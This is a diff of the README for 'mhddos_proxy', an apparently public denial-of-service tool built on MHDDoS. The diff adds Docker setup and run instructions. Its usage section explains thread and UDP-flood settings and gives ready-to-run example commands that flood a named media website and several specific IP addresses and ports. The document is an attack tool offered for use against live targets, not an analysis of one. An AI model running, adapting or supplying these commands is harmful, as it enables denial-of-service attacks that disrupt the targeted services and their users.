@@ -1,14 +1,28 @@
 ## Setup
 
+### Docker
+
+    docker pull portholeascend/mhddos_proxy:latest
+
+### Python
+
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
     cd mhddos_proxy
     git clone https://github.com/MHProDev/MHDDoS.git
     git clone https://github.com/monosans/proxy-scraper-checker.git
-    python3 -m pip install requirements.txt
+    python3 -m pip install -r requirements.txt
 
-# Usage
+## Running
 
-    python3 runner.py --help
+### Docker
+
+    docker run -it portholeascend/mhddos_proxy:latest COMMAND
+
+### Python
+
+    python3 runner.py COMMAND
+
+## Usage
 
     usage: runner.py target [target ...]
                      [-t THREADS] 
@@ -47,6 +61,8 @@ For UDP targets, attack method is UDP FLOOD.
 Separate parameter `--udp-threads` controls the load, the default is 1, **INCREASE SLOWLY**, be careful
 
     python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
+
+    docker run -it portholeascend/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
 Target specification
 
